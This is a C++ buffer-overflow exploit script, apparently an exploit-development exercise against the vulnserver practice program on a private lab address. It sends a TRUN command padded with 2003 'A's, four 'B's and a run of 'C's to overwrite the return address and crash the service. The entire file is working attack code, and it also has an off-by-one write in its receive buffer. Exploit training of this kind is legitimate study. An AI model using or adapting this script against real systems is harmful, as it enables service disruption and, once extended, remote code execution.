#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

using namespace std;

int main() {
    int port = 9999;
    char buffer[5001];               // Including null terminator
    memset(buffer, 'A', 2003);       // Fill the buffer with 2003 'A's
    memset(buffer + 2003, 'B', 4);   // Fill the next 4 bytes with 'B's
    memset(buffer + 2007, 'C', 2993); // Fill the remaining space with 'C's
    
    buffer[5000] = '\0';             // Null terminate the buffer

    int  sock;
    struct sockaddr_in s;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        cerr << "Error: Socket creation failed." << endl;
        return 1;
    }

    s.sin_family = AF_INET;
    s.sin_port = htons(port);
    s.sin_addr.s_addr = inet_addr("192.168.242.130");

    if (connect(sock, (struct sockaddr*) &s, sizeof(s)) < 0) { // Corrected the argument
        cerr << "Error: Connection failed." << endl;
        return 1;
    }

    char recv_buffer[1024];
    ssize_t bytes_received = recv(sock, recv_buffer, 1024, 0);
    if (bytes_received < 0) {
        cerr << "Error: Failed to receive data." << endl;
        close(sock);
        return 1;
    }
    recv_buffer[bytes_received] = '\0';        // Null terminate received data
    cout << recv_buffer << endl;

    cout << "Sending exploit3" << endl;
    if (send(sock, ("TRUN /.:/" + string(buffer)).c_str(), strlen(("TRUN /.:/" + string(buffer)).c_str()), 0) < 0) {
        cerr << "Error: Failed to send data." << endl;
        close(sock);
        return 1;
    }

    bytes_received = recv(sock, recv_buffer, 1024, 0);
    if (bytes_received < 0) {
        cerr << "Error: Failed to receive data :(" << endl;
        close(sock);
        return 1;
    }
    recv_buffer[bytes_received] = '\0';          // Null terminate received data
    cout << recv_buffer << endl;

    close(sock);
    return 0;
}
